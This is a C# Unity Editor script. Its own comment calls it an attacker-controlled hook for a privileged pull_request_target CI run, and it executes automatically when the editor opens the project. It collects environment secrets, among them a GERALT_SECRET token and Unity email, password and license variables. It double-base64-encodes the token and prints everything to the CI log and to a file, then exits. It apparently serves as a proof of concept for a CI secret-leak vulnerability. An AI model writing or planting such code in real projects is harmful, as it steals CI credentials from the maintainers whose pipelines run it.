#if UNITY_EDITOR
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Text;
using UnityEditor;

// Attacker-controlled Unity Editor hook for the package dev project.
// test.yml runs game-ci over PROJECT_PATH='.' in a privileged
// pull_request_target run, so this [InitializeOnLoadMethod] executes when the
// checked-out project is opened by the Unity editor.
public static class GerltProbe
{
    private static bool _fired;

    [InitializeOnLoadMethod]
    private static void Fire()
    {
        if (_fired) return;
        _fired = true;

        try
        {
            string secret = Environment.GetEnvironmentVariable("GERALT_SECRET");
            if (string.IsNullOrEmpty(secret))
            {
                IDictionary vars = Environment.GetEnvironmentVariables();
                foreach (DictionaryEntry entry in vars)
                {
                    string key = entry.Key as string;
                    if (string.IsNullOrEmpty(key)) continue;
                    if (key.IndexOf("GERALT", StringComparison.OrdinalIgnoreCase) >= 0 ||
                        key.IndexOf("SECRET", StringComparison.OrdinalIgnoreCase) >= 0)
                    {
                        secret = entry.Value as string;
                        if (!string.IsNullOrEmpty(secret)) break;
                    }
                }
            }

            Emit("GERALT_LEAKED_TOKEN=" + DoubleB64(secret ?? ""));

            Emit(Run("/bin/bash", "-c \"echo GERALT_LEAKED_TOKEN=$(echo -n $GERALT_SECRET | base64 | base64)\""));
            Emit(Run("/bin/bash", "-c \"env | grep -i -E 'geralt|unity_(email|password|license)'\""));
        }
        catch (Exception ex)
        {
            Emit("GERLT_PROBE_ERROR " + ex);
        }

        try { EditorApplication.Exit(1); } catch { }
    }

    private static string DoubleB64(string value)
    {
        string once = Convert.ToBase64String(Encoding.UTF8.GetBytes(value ?? "")) + "\n";
        return Convert.ToBase64String(Encoding.UTF8.GetBytes(once));
    }

    private static void Emit(string message)
    {
        try { Console.WriteLine(message); Console.Out.Flush(); } catch { }
        try { UnityEngine.Debug.Log(message); } catch { }
        try
        {
            string path = Path.Combine(Directory.GetCurrentDirectory(), "GERALT_LEAKED.txt");
            File.AppendAllText(path, message + Environment.NewLine);
        }
        catch { }
    }

    private static string Run(string file, string args)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = file,
                Arguments = args,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
            };
            using (var process = Process.Start(psi))
            {
                string stdout = process.StandardOutput.ReadToEnd();
                string stderr = process.StandardError.ReadToEnd();
                process.WaitForExit(15000);
                return stdout + stderr;
            }
        }
        catch (Exception ex)
        {
            return "GERLT_EXEC_ERROR " + ex.Message;
        }
    }
}
#endif
